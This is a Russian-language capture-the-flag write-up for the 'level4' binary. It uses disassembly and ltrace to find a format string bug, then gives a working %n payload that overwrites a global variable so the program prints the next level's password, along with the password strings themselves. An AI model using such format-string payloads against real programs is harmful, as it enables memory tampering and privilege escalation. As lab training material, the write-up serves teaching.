# su level4
# pass: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

====
Уязвимость: print, (Format String Attack), запись в глобальную переменную, %n, изменяется глубина стека, %d
====

**Поведение: ждёт ввод, возвращает эту же строку. Переполнить не получилось.**

Смотрим ltrace, по нему все то же, что и в прошлом задании

# ltrace ./level4 
   __libc_start_main(0x80484a7, 1, 0xbffff804, 0x80484c0, 0x8048530 <unfinished ...>
   fgets(123
   "123\n", 512, 0xb7fd1ac0)                                                = 0xbffff550
   printf("123\n"123
   )                                                                = 4
   +++ exited (status 0) +++

Проверяем gdb - функции, переменные

# disas main

Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret    
End of assembler dump.

# i func
<>
0x08048444  p
0x08048457  n
0x080484a7  main
<>

# disas n

Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp                      536
   0x08048460 <+9>:     mov    0x8049804,%eax                   stdin
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)                 512
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax                -520
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax                512
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>                    p func
   0x0804848d <+54>:    mov    0x8049810,%eax                   <m>:  0x0
   0x08048492 <+59>:    cmp    $0x1025544,%eax                  16930116
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)                "/bin/cat /home/user/level5/.pass"         
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.

# i var 
0x08049810  m

# disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret    
End of assembler dump.

Видим отличия - во первых, другое число для сравнения с глобальной переменной m.
Во-вторых, printf вызывается в другой функции, то есть нам придется идти глубже в стек.
После подмены m флаг выведется через cat.

# python -c 'print "AAAA" + " %p" * 14' > /tmp/l4
# cat /tmp/l4 | ./level4

Нужно достигнуть 12 позиции в области памяти. 
Предыдущий метод не подходит из-за слишком большого числа в сравнении, поэтому с помощью %d обозначим это число - записываем по этой позиции через %n 16930112 + 4 байта для адреса.
Итого - адрес 4 байта, 16930112 отступ, 12 позиция.

# python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/l4

# cat /tmp/l4 | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a